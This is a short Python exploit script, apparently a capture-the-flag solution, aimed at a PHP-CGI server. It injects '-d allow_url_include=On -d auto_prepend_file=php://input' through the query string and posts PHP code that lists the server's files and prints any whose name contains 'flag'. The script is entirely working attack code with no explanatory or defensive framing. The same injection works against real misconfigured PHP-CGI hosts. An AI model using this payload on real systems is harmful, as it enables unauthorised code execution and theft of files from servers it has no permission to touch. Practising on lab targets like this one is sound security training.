import requests

url = "http://ctfq.sweetduet.info:10080/~q12/"
query = "?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"

load = '''
 <?php
  foreach(glob('*') as $file){
    if(is_file($file)){
        echo "$file \n";
        $boolean = stristr($file, 'flag');
	if($boolean) {
          print readfile($boolean);
          print "\n";
	}
    }
  }
 ?>
'''
r = requests.post(url+query, data=load)
html = r.text

print(html)
